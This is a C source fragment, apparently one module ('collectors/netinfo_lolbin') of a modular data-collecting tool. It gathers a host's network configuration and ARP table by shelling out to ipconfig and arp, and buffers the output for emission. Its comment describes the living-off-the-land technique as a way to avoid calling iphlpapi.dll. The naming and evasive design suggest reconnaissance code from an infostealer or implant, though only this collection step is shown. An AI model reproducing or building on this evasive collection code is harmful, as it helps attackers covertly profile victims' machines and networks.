// chunk: collectors/netinfo_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: collect_netinfo
// note: LOLBin network info via ipconfig + arp — no iphlpapi.dll

#ifndef CHUNK_NETINFO_LOLBIN
#define CHUNK_NETINFO_LOLBIN

static void collect_netinfo(void) {
    emitf("=== NETWORK INFO ===\r\n");
    char buf[8192] = {0};
    DWORD buf_len = 0;
    run_cmd("cmd /c ipconfig /all", buf, sizeof(buf), &buf_len);
    if (buf_len > 0) emitf("%.*s", (int)buf_len, buf);

    buf[0] = '\0'; buf_len = 0;
    run_cmd("cmd /c arp -a", buf, sizeof(buf), &buf_len);
    if (buf_len > 0) emitf("%.*s", (int)buf_len, buf);
    emitf("\r\n");
}

#endif
